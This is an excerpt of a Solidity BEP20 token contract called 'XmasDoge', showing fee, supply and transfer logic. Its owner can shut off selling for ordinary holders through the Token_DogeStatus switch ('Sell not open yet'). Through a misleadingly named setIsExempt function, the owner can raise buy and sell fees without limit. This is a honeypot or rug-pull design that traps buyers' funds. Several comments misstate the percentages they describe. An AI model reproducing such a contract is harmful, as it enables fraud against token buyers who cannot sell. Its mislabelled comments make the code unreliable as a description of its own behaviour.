...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20  COIN = IBEP20(0xbA2aE424d960c26247Dd6c32edC70B295c744C43); //COIN
...
contract Token is IBEP20, Auth {
    ...
    address COIN = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string private _name = 'XmasDoge';
    string private _symbol = 'XDG';
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1 * 10**15 * (10 ** _decimals); //1 trillion
    uint256 public _maxWalletAmount = 90 * 10**9 * (10 ** _decimals); //2% of total supply
    uint256 public _maxBuyTxAmount = 90 * 10**9 * (10 ** _decimals); //1% of total supply
    uint256 public _maxSellTxAmount = 50 * 10**9 * (10 ** _decimals); //0.5%% of total supply
    ...
    uint256 extraFeeOnSell = 4;
    
    uint256 public totalFee = 0;
    uint256 public totalFeeSell = 0;
    ...
    uint256 public swapThreshold = _totalSupply * 10 / 10000; // 0.01% of total supply
    bool inSwap;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xD2BF91f499644e57f3a94317b1C13f210AcE4c74;
        
        totalFee = liquidityFee.add(reflectionFee).add(marketingFee);
        totalFeeSell = totalFee.add(extraFeeOnSell);
    ...
    function Token_DogeStatus(bool _status) public onlyOwner {
        Token_Doge = _status;
    }
    ...
    function setIsExempt(uint256 _liquid, uint256 _reflec, uint256 _market, uint256 _extra) external authorized {
        ...
        totalFee = _liquid.add(_reflec).add(_market);
        totalFeeSell = totalFee.add(_extra);
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(recipient == pair && !authorizations[sender] && !isTimelockExempt[sender]) {
            require(Token_Doge, "Sell not open yet");
        }
        ...
        if (!authorizations[sender] && !authorizations[recipient] && !isWalletLimitExempt[recipient] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair) {
            if (recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver) {
